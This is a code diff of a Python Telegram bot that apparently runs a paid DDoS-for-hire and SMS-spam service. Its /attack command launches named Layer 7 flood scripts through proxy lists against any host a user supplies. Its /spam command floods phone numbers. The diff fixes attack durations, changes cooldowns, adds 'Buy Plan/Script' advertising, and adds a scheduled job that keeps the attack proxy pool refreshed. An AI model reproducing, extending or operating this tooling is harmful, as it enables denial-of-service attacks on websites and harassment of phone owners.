@@ -5,6 +5,7 @@ import os
 import subprocess
 import psutil
 import sqlite3
+import shutil
 import hashlib
 import requests
 import sys
@@ -13,6 +14,7 @@ import zipfile
 import io
 import re
 import threading
+import schedule
 
 # Uptime PART
 from server import alive
@@ -142,7 +144,6 @@ def help(message):
  - /check <target> : Check Protect system of target ( Lack of % )
  - /code <target> : Get target source code
  - /proxy : Control bot proxies
- - /getproxy : Get new list of proxies after 10 minutes
  - /time : Get bot uptime data
  - /admin : See Admin activity
 
@@ -193,7 +194,7 @@ def methods(message):
 [ 💎 ]   Spam SMS
      - /spam <phone number>
 
-[ 📎 ]   ATTACK ?\n Layer 7 | /attack [ method ] [ host ] [ duration ]\n Layer 4 | /attack [ method ] [ ip ] [ port ] [ time ]
+[ 📎 ]   ATTACK ?\n Layer 7 | /attack [ method ] [ host ]\n Layer 4 | /attack [ method ] [ ip ] [ port ]
 '''
     image_path = 'BB/methods.png'
     with open(image_path, 'rb') as image_file:
@@ -237,21 +238,20 @@ def attack_command(message):
         return
 
     if len(message.text.split()) < 3:
-        bot.reply_to(message, '[ 👻 ]   How to attack:\n Layer 7 | /attack [method] [host] [duration]\n [ Maintenace ] Layer 4 | /attack [method] [ip] [port] ')
+        bot.reply_to(message, '[ 👻 ]   How to attack:\n Layer 7 | /attack [method] [host]\n [ Maintenace ] Layer 4 | /attack [method] [ip] [port] ')
         return
 
     username = message.from_user.username
 
     current_time = time.time()
-    if username in cooldown_dict and current_time - cooldown_dict[username].get('attack', 0) < 120:
-        remaining_time = int(120 - (current_time - cooldown_dict[username].get('attack', 0)))
+    if username in cooldown_dict and current_time - cooldown_dict[username].get('attack', 0) < 150:
+        remaining_time = int(150 - (current_time - cooldown_dict[username].get('attack', 0)))
         bot.reply_to(message, f"@{username}! Please wait {remaining_time}s To use the command again!")
         return
     
     args = message.text.split()
     method = args[1].upper()
     host = args[2]
-    atime = args[3]
 
     #Attack Area
     blocked_domains = ["chinhphu.vn", "daxg.space", ".edu.vn", ".gov"]   
@@ -265,36 +265,36 @@ def attack_command(message):
         # Update the command and duration based on the selected method
         if method == 'PLUTO':
             os.chdir("L7")
-            command = ["node", "Pluto.js", host, atime, "200", "14", "proxy.txt", "bypass"]
-            duration = atime
+            command = ["node", "Pluto.js", host, "60", "200", "14", "proxy.txt", "bypass"]
+            duration = 60
         if method == 'CYCLONIC':
             os.chdir("L7")
-            command = ["node", "Cyclonic.js", host, atime, "64", "12", "proxy.txt"]
-            duration = atime
+            command = ["node", "Cyclonic.js", host, "60", "64", "12", "proxy.txt"]
+            duration = 60
         if method == 'VOIDLASH':
             os.chdir("L7")
-            command = ["node", "Voidlash.js", host, atime, "14", "proxy.txt", "14", "10"]
-            duration = atime
+            command = ["node", "Voidlash.js", host, "60", "14", "proxy.txt", "14", "10"]
+            duration = 60
         elif method == 'POSEIDON':
             os.chdir("L7")
-            command = ["node", "Poseidon.js", host, atime, "12", "proxy.txt", "autorate"]
-            duration = atime
+            command = ["node", "Poseidon.js", host, "60", "12", "proxy.txt", "autorate"]
+            duration = 60
         elif method == 'OPIUM':
             os.chdir("L7")
-            command = ["node", "Opium.js", host, atime, "100", "12", "GET", "proxy.txt"]
-            duration = atime
+            command = ["node", "Opium.js", host, "60", "100", "12", "GET", "proxy.txt"]
+            duration = 60
         elif method == 'ZENITH':
             os.chdir("L7")
-            command = ["node", "Zenith.js", host, atime, "100", "12", "proxy.txt"]
-            duration = atime
+            command = ["node", "Zenith.js", host, "60", "100", "12", "proxy.txt"]
+            duration = 60
         elif method == 'FRIXIZ':
             os.chdir("L7")
-            command = ["node", "Frixiz.js", host, atime, "15", "12", "proxy.txt"]
-            duration = atime
+            command = ["node", "Frixiz.js", host, "60", "15", "12", "proxy.txt"]
+            duration = 60
         elif method == 'GLAXIA':
             os.chdir("L7")
-            command = ["node", "Glaxia.js", host, atime, "64", "12", "proxy.txt"]
-            duration = atime
+            command = ["node", "Glaxia.js", host, "60", "64", "12", "proxy.txt"]
+            duration = 60
    #     elif method == 'UDP-FLOOD':
    #         if not port.isdigit():
    #             bot.reply_to(message, 'Port phải là một số nguyên dương.')
@@ -303,20 +303,24 @@ def attack_command(message):
    #         command = ["python", "udp.py", host, port, "120", "64", "35"]
    #         duration = 120
    #     elif method == 'TCP-KILL':
-   #         if not atime.isdigit():
+   #         if not 60.isdigit():
    #             bot.reply_to(message, 'Port must be a positive number.')
    #             return
    #         os.chdir("L4")
-   #         command = ["python", "tcp.py", host, port, "1000", "12", atime]
-   #         duration = atime
+   #         command = ["python", "tcp.py", host, port, "1000", "12", 60]
+   #         duration = 60
 
         cooldown_dict[username] = {'attack': current_time}
 
         attack_thread = threading.Thread(target=run_attack, args=(command, duration, message))
         attack_thread.start()
-        bot.reply_to(message, f'[ ⚡ ]  Attack SuccesFully Sent\n  ┏➤ Admin: @prifxz\n  - Attack by {username}\n  - Target: {host}\n  - Duration: {duration}s\n  - Method: {method}\n  - Cooldown: 120s\n  ┗➤ Plan: VIP')
-    else:
-        bot.reply_to(message, 'Attack Not Indival Methods. Please use /methods to see attacking methods!')
+        if attack_thread.start:
+            attacksent = f'[ ⚡ ]  Attack SuccesFully Sent\n  ┏➤ Admin: @prifxz\n  - Attack by {username}\n  - Target: {host}\n  - Duration: {duration}s\n  - Method: {method}\n  - Cooldown: 150s\n  ┗➤ Plan: VIP\n[ 💎 ]  Buy Plan/Script dms @prifxz'
+            image_path = '/workspaces/telegram/BB/attacksent.png'
+            with open(image_path, 'rb') as image_file:
+                bot.send_photo(chat_id=message.chat.id, photo=image_file, caption=attacksent, reply_to_message_id=message.message_id)
+        else:
+            bot.reply_to(message, 'Attack Not Individual Methods. Please use /methods to see attacking methods!')
 
 
 @bot.message_handler(commands=['proxy'])
@@ -327,7 +331,7 @@ def proxy_command(message):
             with open("L7/proxy.txt", "r") as proxy_file:
                 proxies = proxy_file.readlines()
                 num_proxies = len(proxies)
-                bot.reply_to(message, f"Số lượng proxy: {num_proxies}")
+                bot.reply_to(message, f"Total Proxies: {num_proxies}")
         except FileNotFoundError:
             bot.reply_to(message, "Cannot find proxy.txt.")
     else:
@@ -459,31 +463,6 @@ start_time = time.time()
 proxy_update_count = 0
 proxy_update_interval = 600 
 
-@bot.message_handler(commands=['getproxy'])
-def get_proxy_info(message):
-    user_id = message.from_user.id
-    global proxy_update_count
-
-    if not is_bot_active:
-        bot.reply_to(message, 'Bot is currently under maintenace. Be patient\nContact @prifxz if you  have any issues')
-        return
-    
-    if user_id not in allowed_users:
-        bot.reply_to(message, text='Please apply your key\nPlease use /getkey to get your own key')
-        return
-
-    try:
-        with open("./L7/proxy.txt", "r") as proxy_file:
-            proxy_list = proxy_file.readlines()
-            proxy_list = [proxy.strip() for proxy in proxy_list]
-            proxy_count = len(proxy_list)
-            proxy_message = f'Auto update after 10 minutes\n Total Proxies: {proxy_count}\n'
-            bot.send_message(message.chat.id, proxy_message)
-            bot.send_document(message.chat.id, open("./L7/proxy.txt", "rb"))
-            proxy_update_count += 1
-    except FileNotFoundError:
-        bot.reply_to(message, "Cannot find proxy.txt.")
-
 
 @bot.message_handler(commands=['time'])
 def show_uptime(message):
@@ -544,8 +523,8 @@ def attack_command(message):
         bot.reply_to(message, 'Cannot spam this numbers.')
         return
 
-    if user_id in cooldown_dict and time.time() - cooldown_dict[user_id] < 90:
-        remaining_time = int(90 - (time.time() - cooldown_dict[user_id]))
+    if user_id in cooldown_dict and time.time() - cooldown_dict[user_id] < 200:
+        remaining_time = int(200 - (time.time() - cooldown_dict[user_id]))
         bot.reply_to(message, f'Please wait {remaining_time}s To use the command again!')
         return
     
@@ -558,10 +537,55 @@ def attack_command(message):
 
     attack_thread = threading.Thread(target=run_sms, args=(command, duration, message))
     attack_thread.start()
-    bot.reply_to(message, f'[ ⚡ ]  Attack SuccesFully Sent\n  ┏➤ Admin: @prifxz\n  - Attack by @{username}\n  - Target: {phone_number}\n  - Duration: 120s\n - Method: Phone Bulk\n  - Cooldown: 120s\n  ┗➤ Plan: VIP')
+    bot.reply_to(message, f'[ ⚡ ]  Attack SuccesFully Sent\n  ┏➤ Admin: @prifxz\n  - Attack by @{username}\n  - Target: {phone_number}\n  - Duration: 120s\n - Method: Phone Bulk\n  - Cooldown: 200s\n  ┗➤ Plan: VIP')
 
 @bot.message_handler(func=lambda message: message.text.startswith('/'))
 def invalid_command(message):
     bot.reply_to(message, 'Invalid command! Please use the /help command to see the command list.')
 
-bot.infinity_polling(timeout=60, long_polling_timeout = 1)
+def update_proxies():
+    try:
+        print("Updating proxies...")
+        os.chdir("AA")  # Change directory to the folder containing proxy.py
+        subprocess.run(["python", "proxy.py"])  # Assuming proxy.py is your script to update proxies
+        os.chdir("..")  # Change back to the main directory
+        time.sleep(30)  # Wait for 30 seconds
+        os.chdir("AA")
+        subprocess.run(["python", "check.py", "needtocheck.txt"])  # Assuming check.py is your script to check proxies
+        os.chdir("..")
+        print("Check process completed.")  # Indicate when the check process is completed
+        proxy_file_path = os.path.join("AA", "proxy.txt")
+        if os.path.exists(proxy_file_path):  # Check if proxy.txt file exists
+            print("Proxy file found. Copying and replacing...")  # Indicate when copying and replacing begins
+            shutil.copy(proxy_file_path, "/workspaces/telegram/L7/proxy.txt")  # Copy and replace proxy file
+            print("Proxy file copied and replaced successfully.")
+        else:
+            print("Proxy file not found. Skipping copying and replacing.")
+    except FileNotFoundError:
+        print("Cannot find proxy.py or check.py.")
+
+def schedule_update():
+    # Schedule the proxy update task every 10 minutes
+    schedule.every(10).minutes.do(update_proxies)
+
+    # Run the scheduler in a loop
+    while True:
+        schedule.run_pending()
+        time.sleep(1)
+
+def start_bot():
+    # Start the bot's event loop
+    bot.infinity_polling(timeout=60, long_polling_timeout=1)
+
+if __name__ == "__main__":
+    # Create threads for bot and scheduler
+    bot_thread = threading.Thread(target=start_bot)
+    scheduler_thread = threading.Thread(target=schedule_update)
+
+    # Start both threads
+    bot_thread.start()
+    scheduler_thread.start()
+
+    # Wait for both threads to finish
+    bot_thread.join()
+    scheduler_thread.join()
